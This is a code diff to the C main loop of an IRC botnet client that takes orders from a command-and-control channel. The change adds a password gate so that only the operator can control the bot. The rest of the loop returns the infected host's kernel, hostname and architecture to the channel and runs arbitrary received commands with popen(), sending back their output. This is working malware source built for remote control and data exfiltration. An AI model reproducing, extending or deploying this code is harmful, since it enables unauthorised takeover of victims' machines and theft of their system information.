@@ -8,6 +8,7 @@
 #include <string.h>
 #include <stdio.h>
 #include <sys/utsname.h>
+#include <stdbool.h>
 
 /*	et_main_loop_nix
 	The main loop called by et_nix.c to communicate with the IRC C&C server.
@@ -17,6 +18,7 @@
 void et_main_loop_nix(int socket, char *nick)
 {
 	char buf[1024];
+	bool auth = false;
 
 	while(1)
 	{
@@ -34,48 +36,85 @@ void et_main_loop_nix(int socket, char *nick)
 		{
 			char *line = strtok(buf, "\r\n");
 			char *cmd = strrchr(line, ':');
-			cmd++;
+			cmd++; /* increment past the : */
 
-			if (!strcmp(cmd, "quit"))
+			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
 			{
-				break; /* back to main@et_nix.c */
-			}
-			else if (!strcmp(cmd, "info"))
-			{
-				struct utsname sys_info;
-				uname(&sys_info);
+				cmd += 5; /* increment past 'auth' */
+				char auth_message[256];
 
-				char sysname[512];
-				char nodename[512];
-				char release[512];
-				char version[512];
-				char machine[512];
-
-				snprintf(sysname, 512, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
-				send(socket, sysname, strlen(sysname), 0);
-
-				snprintf(nodename, 512, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
-				send(socket, nodename, strlen(nodename), 0);
-				
-				snprintf(release, 512, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
-				send(socket, release, strlen(release), 0);
-
-				snprintf(version, 512, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
-				send(socket, version, strlen(version), 0);
-
-				snprintf(machine, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
-				send(socket, machine, strlen(machine), 0);
+				if (!strcmp(cmd, IRC_AUTH))
+				{
+					auth = true;
+					
+					snprintf(auth_message, 256, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
+					send(socket, auth_message, strlen(auth_message), 0);
+				}
+				else
+				{
+					snprintf(auth_message, 256, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
+					send(socket, auth_message, strlen(auth_message), 0);
+				}
 			}
 			else
 			{
-				char cmd_output[512];
-				char cmd_message[1024];
+				if (!auth)
+				{
+					char unauth_message[256];
+					snprintf(unauth_message, 256, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
+					send(socket, unauth_message, strlen(unauth_message), 0);
+				}
+				else
+				{
+					if (!strcmp(cmd, "quit"))
+					{
+						break; /* back to main@et_nix.c */
+					}
+					else if (!strcmp(cmd, "deauth"))
+					{
+						char deauth_message[256];
+						snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
+						send(socket, deauth_message, strlen(deauth_message), 0);
+						auth = false;
+					}
+					else if (!strcmp(cmd, "info"))
+					{
+						struct utsname sys_info;
+						uname(&sys_info);
 
-				FILE *output_file = popen(cmd, "r");
-				fgets(cmd_output, 512, output_file);
-				snprintf(cmd_message, 1024, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
-				send(socket, cmd_message, strlen(cmd_message), 0);
-				pclose(output_file);
+						char sysname[512];
+						char nodename[512];
+						char release[512];
+						char version[512];
+						char machine[512];
+
+						snprintf(sysname, 512, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
+						send(socket, sysname, strlen(sysname), 0);
+
+						snprintf(nodename, 512, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
+						send(socket, nodename, strlen(nodename), 0);
+						
+						snprintf(release, 512, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
+						send(socket, release, strlen(release), 0);
+
+						snprintf(version, 512, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
+						send(socket, version, strlen(version), 0);
+
+						snprintf(machine, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
+						send(socket, machine, strlen(machine), 0);
+					}
+					else
+					{
+						char cmd_output[512];
+						char cmd_message[1024];
+
+						FILE *output_file = popen(cmd, "r");
+						fgets(cmd_output, 512, output_file);
+						snprintf(cmd_message, 1024, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+						send(socket, cmd_message, strlen(cmd_message), 0);
+						pclose(output_file);
+					}
+				}
 			}
 		}
 	}
